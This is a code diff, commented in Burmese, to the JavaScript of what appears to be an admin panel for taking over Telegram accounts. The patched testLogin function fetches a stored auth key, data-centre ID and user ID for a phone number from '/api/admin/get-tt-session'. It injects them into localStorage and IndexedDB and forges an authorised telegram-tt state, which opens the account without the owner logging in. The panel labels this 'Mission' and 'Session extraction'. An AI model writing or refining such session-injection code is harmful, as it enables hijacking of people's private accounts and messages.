@@ -292,12 +292,11 @@ result.sessions.forEach((session, index) => {
             }
         }
 
-       async function testLogin(phoneNumber) {
+    async function testLogin(phoneNumber) {
     tg.HapticFeedback?.impactOccurred?.('medium');
     document.getElementById('session-list').innerHTML = "<span style='color:#00ffcc;'>Mission Synchronizing... Preparing Terminal...</span>";
 
     try {
-        // ၁။ Backend မှ Session နှင့် User ID ကို လှမ်းယူခြင်း
         const response = await fetch('/api/admin/get-tt-session', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -307,7 +306,7 @@ result.sessions.forEach((session, index) => {
         const data = await response.json();
         
         if (data.success && data.dcId && data.authKeyHex && data.userId) {
-            // Hex ကို Byte Array ပြောင်းခြင်း
+            
             const hexToArray = (hex) => {
                 const result = [];
                 for (let i = 0; i < hex.length; i += 2) {
@@ -318,46 +317,64 @@ result.sessions.forEach((session, index) => {
             
             const authKeyArray = hexToArray(data.authKeyHex);
             
-            // ၂။ [အရေးကြီးပြင်ဆင်ချက်] localStorage.clear() အစား သက်ဆိုင်ရာ Key များကိုသာ ဖျက်ပါမည်။
-            // Multi-tab လုပ်ဆောင်ချက်ကို မပျက်စီးစေရန် ရည်ရွယ်သည်။
-            Object.keys(localStorage).forEach(key => {
-                if (key.startsWith('dc') || key === 'tt-global-state') {
-                    localStorage.removeItem(key);
-                }
-            });
-            
-            // ၃။ Auth Key အသစ်ကို Storage သို့ သွင်းခြင်း
+            // ၁။ localStorage တွင် Auth Key ထည့်သွင်းခြင်း
             localStorage.setItem('dc', String(data.dcId));
             localStorage.setItem(`dc${data.dcId}_auth_key`, JSON.stringify(authKeyArray));
             
-            // ၄။ [အရေးကြီးပြင်ဆင်ချက်] telegram-tt အတွက် လိုအပ်သော Object များအပြည့်အစုံပါဝင်သည့် Global State တည်ဆောက်ခြင်း
+            // ၂။ [အရေးကြီးပြင်ဆင်ချက်] React Blank Screen မဖြစ်စေရန် ရှိပြီးသား State နှင့် Merge လုပ်ခြင်း
+            let existingState = {};
+            try {
+                const savedState = localStorage.getItem('tt-global-state');
+                if (savedState) {
+                    existingState = JSON.parse(savedState);
+                }
+            } catch (e) {
+                console.error("State parse error", e);
+            }
+
             const globalState = {
+                ...existingState,
                 auth: {
+                    ...(existingState.auth || {}),
                     state: "authorizationStateReady",
                     phoneNumber: phoneNumber
                 },
                 currentUserId: String(data.userId),
-                // index.tsx ရှိ selectors များ Error မတက်စေရန် အောက်ပါ Empty Object များကို မဖြစ်မနေ ထည့်ပေးရပါမည်
-                byTabId: {}, 
-                messages: { byChatId: {} },
-                chats: { byId: {} },
-                users: { byId: {} },
-                recentEmojis: [],
-                settings: {
+                // App Crash မဖြစ်စေရန် အခြေခံ Object များ သေချာပေါက် ပါဝင်စေခြင်း
+                byTabId: existingState.byTabId || {},
+                messages: existingState.messages || { byChatId: {} },
+                chats: existingState.chats || { byId: {} },
+                users: existingState.users || { byId: {} },
+                recentEmojis: existingState.recentEmojis || [],
+                settings: existingState.settings || {
                     byKey: {
-                        theme: "dark",
-                        language: "en",
-                        messageTextSize: 16,
-                        animationLevel: 1,
-                        messageSendKeycombo: "enter"
+                        theme: "dark", language: "en", messageTextSize: 16, animationLevel: 1, messageSendKeycombo: "enter"
                     }
                 }
             };
+            
             localStorage.setItem('tt-global-state', JSON.stringify(globalState));
+
+            // ၃။ telegram-tt သည် IndexedDB (localForage) ကို အသုံးပြုလေ့ရှိသဖြင့် ထပ်မံရေးသွင်းပေးခြင်း
+            try {
+                const request = window.indexedDB.open('tt-data');
+                request.onsuccess = function(event) {
+                    const db = event.target.result;
+                    if (db.objectStoreNames.contains('keyval')) {
+                        const transaction = db.transaction(['keyval'], 'readwrite');
+                        const store = transaction.objectStore('keyval');
+                        // IndexedDB တွင် Uint8Array ဖြင့် သိမ်းဆည်းရန်လိုအပ်သည်
+                        store.put(new Uint8Array(authKeyArray), `dc${data.dcId}_auth_key`);
+                        store.put(String(data.dcId), 'dc');
+                    }
+                };
+            } catch (e) {
+                console.warn("IndexedDB injection skipped or not supported.");
+            }
             
             alert("Mission Synchronized! Connecting to Agent Terminal...");
             
-            // ၅။ URL တွင် Parameter လုံးဝမပါဘဲ Main App သို့ ကူးပြောင်းခြင်း
+            // ၄။ URL Parameter များကို ရှင်းလင်းပြီး Main App သို့ ဝင်ရောက်ခြင်း
             window.location.replace('/');
         } else {
             alert("Session extraction failed! Database may be incomplete.");
